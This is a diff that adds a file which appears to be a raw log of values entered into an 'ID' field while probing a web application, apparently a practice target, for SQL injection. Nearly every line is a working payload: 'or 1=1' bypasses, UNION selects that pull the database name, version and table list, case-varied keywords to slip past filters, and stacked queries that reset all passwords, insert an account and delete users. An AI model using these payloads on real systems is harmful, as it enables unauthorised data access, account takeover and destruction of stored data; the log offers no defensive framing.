@@ -1,0 +1,42 @@
+ID:1
+ID:' or 1=1-- -
+ID:o' or 1=1-- -
+ID:0' or 1=1-- -
+ID:0 union select 1,2,3-- -
+ID:0' union select 1,2,3-- -
+ID:1
+ID:1 union select 1,database(),version()-- -
+ID:0 union select 1,database(),version()-- -
+ID:1 uNIon sELect 1,database(),version()-- -
+ID:1
+ID:' or 1=1-- -
+ID:0' or 1=1-- -
+ID:0' or 1=1-- -
+ID:0' uniON SelECt 1,2,3-- -
+ID:0' uniON sqlect 1,2,3-- -
+ID:0' uniON sqlect 1,2,3-- -
+ID:0' uniON select 1,2,3-- -
+ID:0' uniON select 1,database(),3-- -
+ID:0' union select 1,table_name_3 from information_schema.tables where table_schema=database()-- -
+ID:0' union select 1,table_name,3 from information_schema.tables where table_schema=database()-- -
+ID:0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()-- -
+ID:1;update users set password="hi"-- -
+ID:1;update users set password="hi"-- -
+ID:1;insert into users (username,password) values('asd','asd')-- -
+ID:1;insert into users (username,password) value('asd','asd')-- -
+ID:1;insert into users (username,password) value('asd','asd');-- -
+ID:1;insert into users (username,password) values('asd','asd');-- -
+ID:1'; insert into users ( username,password) values('asd','asd',);-- -
+ID:0'; insert into users ( username,password) values('asd','asd',);-- -
+ID:1'; insert into users (username,password) values('asd','asd',);-- -
+ID:1'; insert into users (username,password) values('asd','asd');-- -
+ID:1';delete from users where username='asd';-- -
+ID:'; insert into users (username,password) values ('asd','asd');-- -
+ID:1
+ID:1'
+ID:1;select 1,2,3-- -
+ID:0;select 1,2,3-- -
+ID:0;select 1,2,3-- -
+ID:0;select 1,2,3-- -
+ID:0;select 1,2,3-- -
+ID:0;select 1,2,3-- -
